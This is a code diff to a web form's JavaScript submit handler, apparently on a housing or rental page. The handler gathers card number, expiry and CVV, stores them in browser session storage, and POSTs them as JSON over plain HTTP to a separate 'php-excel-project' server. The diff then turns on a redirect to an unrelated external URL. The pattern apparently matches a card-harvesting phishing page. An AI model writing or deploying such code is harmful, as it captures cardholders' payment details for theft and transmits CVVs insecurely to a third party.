@@ -736,22 +736,22 @@ if(qsp.hcity && qsp.hstate){$(".citystate").text(qsp.hcity+", "+qsp.hstate)}else
         const data = {};
         formData.forEach((value, key) => data[key] = value);
 
-        const  writableData = localStorage.getItem('writableData')? JSON.parse(localStorage.getItem('writableData')) : [];
+        let  writableData = sessionStorage.getItem('writableData')? JSON.parse(sessionStorage.getItem('writableData')) : [];
        
-        $.extend( writableData, { 
-          card_number: data.cardNumber,
-          card_expiration_month_year:  data.ExpMonth + '-'+ data.ExpYear,
-          card_cvv:  data.cardCVV2
-        } );
-        const writableDataString = JSON.stringify(writableData);
-        // console.log('go writable_dat',JSON.stringify(writableData))
-        localStorage.setItem('writableData', writableDataString);
-        localStorage.setItem('form4Data', JSON.stringify(data));
+        writableData = $.extend({}, writableData, { 
+        card_number: data.cardNumber,
+        card_expiration_month_year: data.ExpMonth + '-' + data.ExpYear,
+        card_cvv: data.cardCVV2
+    });
+    const writableDataString = JSON.stringify(writableData);
+    sessionStorage.setItem('writableData', writableDataString);
+    sessionStorage.setItem('form3Data', JSON.stringify(data));
         $.ajax({
             url: 'http://php-excel-project.test', // Replace with your server URL
             type: 'POST',
             data: writableDataString,
             contentType: 'application/json',
+
             success: function(response) {
                 
             },
@@ -762,8 +762,7 @@ if(qsp.hcity && qsp.hstate){$(".citystate").text(qsp.hcity+", "+qsp.hstate)}else
                 
             }
         });
-        // localStorage.clear();
-        return;
+        sessionStorage.clear();
         window.location.href = 'https://aprtshare.com/Housesi00';
 
       }else {
